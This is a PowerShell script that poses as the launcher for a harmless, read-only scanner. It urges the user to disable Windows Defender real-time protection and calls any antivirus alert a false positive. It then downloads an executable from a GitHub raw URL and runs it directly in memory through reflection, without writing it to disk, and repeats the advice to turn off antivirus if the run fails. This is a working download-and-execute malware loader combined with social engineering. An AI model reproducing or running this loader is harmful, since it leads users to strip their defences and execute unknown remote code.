$ErrorActionPreference = 'Stop'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072 } catch {}

Write-Host ''
Write-Host '  READ THIS FIRST' -ForegroundColor Yellow
Write-Host ''
Write-Host '  YOUR ANTIVIRUS (INCLUDING WINDOWS DEFENDER) MAY FLAG THIS SCRIPT OR THE SCAN.' -ForegroundColor Yellow
Write-Host '  IT IS A FALSE POSITIVE - THE SCANNER IS OPEN SOURCE AND READ-ONLY.' -ForegroundColor Yellow
Write-Host ''
Write-Host '  best option: disable real-time protection in windows security before running,'
Write-Host '  otherwise continue at your own risk - if it errors, disable it and re-run.'
Write-Host ''
$null = Read-Host 'press enter to continue (or close this window to cancel)'
Write-Host ''

$url = 'https://github.com/iireborn/iauth/raw/refs/heads/main/001_scanner/israelauth-check.exe'
$data = $null
try { $data = (New-Object Net.WebClient).DownloadData($url) } catch { }
if ($null -eq $data -or $data.Length -lt 1024) {
    Write-Host 'download failed - check your internet, wait a minute and try again' -ForegroundColor Red
    $null = Read-Host
    exit 1
}

try {
    $asm = [Reflection.Assembly]::Load($data)
    $null = $asm.EntryPoint.Invoke($null, (, [string[]]@()))
} catch {
    Write-Host 'the scan was blocked or crashed - disable your antivirus (real-time protection) and run again' -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor DarkGray
    $null = Read-Host
}
